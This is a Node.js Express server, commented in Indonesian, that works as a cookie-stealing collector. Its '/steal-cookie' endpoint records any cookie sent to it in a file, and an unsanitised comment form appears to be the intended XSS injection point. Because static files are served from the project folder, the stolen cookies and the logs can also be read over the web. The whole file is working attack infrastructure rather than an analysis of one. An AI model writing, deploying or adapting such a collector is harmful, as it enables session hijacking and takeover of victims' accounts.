const winston = require("winston");
const path = require("path");

// Konfigurasi winston untuk mencatat log ke file log.txt
const logger = winston.createLogger({
  level: "info",
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.printf(({ timestamp, level, message }) => {
      return `[${timestamp}] ${level.toUpperCase()}: ${message}`;
    })
  ),
  transports: [
    new winston.transports.File({ filename: path.join(__dirname, "log.txt") }),
  ],
});

// Menulis log ke file menggunakan winston
logger.info("Server started");

const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");

const app = express();
const port = 3000; // hapus ini jika ingin dijalankan di hosting online

// Middleware untuk menyajikan file statis
app.use(express.static(__dirname));

// Middleware untuk parsing data dari body request
app.use(bodyParser.urlencoded({ extended: true }));

app.get("/steal-cookie", (req, res) => {
  console.log("Steal-cookie endpoint was hit.");
  const cookieData = req.query.cookie || "No cookies found";

  // Logging untuk memeriksa apakah data cookie diterima
  logger.info("Cookie data received: " + cookieData);

  // Simpan data cookie ke file
  fs.appendFile(
    path.join(__dirname, "cookies.txt"),
    cookieData + "\n",
    (err) => {
      if (err) {
        logger.info("Gagal menyimpan cookie:", err);
      } else {
        logger.info("Cookie berhasil disimpan.");
      }
    }
  );

  // Kirim respons
  res.send("Cookie diterima");
});

// Endpoint untuk menangani form submission
app.post("/submit", (req, res) => {
  const userComment = req.body.comment;

  // Simpan komentar pengguna ke file atau lakukan sesuatu dengan datanya
  fs.appendFile(
    path.join(__dirname, "comments.txt"),
    userComment + "\n",
    (err) => {
      if (err) {
        logger.info("Gagal menyimpan komentar:", err);
      }
    }
  );

  // Kirim respons dan tampilkan kembali halaman utama
  res.redirect("/");
});

// Route untuk halaman utama
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Jalankan server di local host
app.listen(port, () => {
  console.log(`Server berjalan di http://localhost:${port}`);
});

// // Jika ingin diupload ke hosting
// const port = process.env.PORT || 3000;
// app.listen(port, () => {
//   logger.info(`Server berjalan di http://localhost:${port}`);
// });
